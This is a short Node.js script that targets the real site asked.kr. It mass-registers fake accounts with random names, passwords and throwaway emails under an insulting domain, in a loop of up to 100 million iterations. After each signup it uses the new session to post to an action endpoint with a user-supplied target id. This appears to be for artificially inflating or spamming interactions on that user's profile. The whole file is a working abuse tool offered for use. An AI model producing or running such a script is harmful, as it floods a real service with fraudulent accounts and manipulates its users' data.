const axios = require("axios");
const { randomString } = require("./util");
const readline = require("readline");
const { URLSearchParams } = require("url");

const BASE_URL = "https://asked.kr";
const MAX_REPEAT = 100_000_000;
const instance = axios.default.create({ timeout: 3000 });

main();

async function main() {
    let id = await read("id: ");
    id = id.trim();

    for (let i = 0; i < MAX_REPEAT; i++) {
        await run(id);
    }
}

async function run(userId) {
    try {
        let id = randomString(11);
        let form = new URLSearchParams({
            reg_name: randomString(10),
            reg_email: `${randomString(10)}@askedfuckyou.net`,
            reg_id: id,
            reg_pw: randomString(14),
        }).toString();

        let signUpRes = await instance.post(`${BASE_URL}/sing_up.php`, form);
        console.log("id: ", id);

        let sessionId = getCookie(signUpRes.headers["set-cookie"]);

        await instance.post(`${BASE_URL}/query.php?query=22`, `num=${userId}`, {
            headers: {
                Cookie: sessionId,
            },
        });
    } catch (e) {
        console.log(e);
    }
}

async function read(question) {
    let rl = readline.createInterface(process.stdin, process.stdout);

    let res = await new Promise((resolve) => rl.question(question, resolve));

    rl.close();
    return res;
}

function getCookie(raw) {
    return raw[0].split(" ")[0];
}
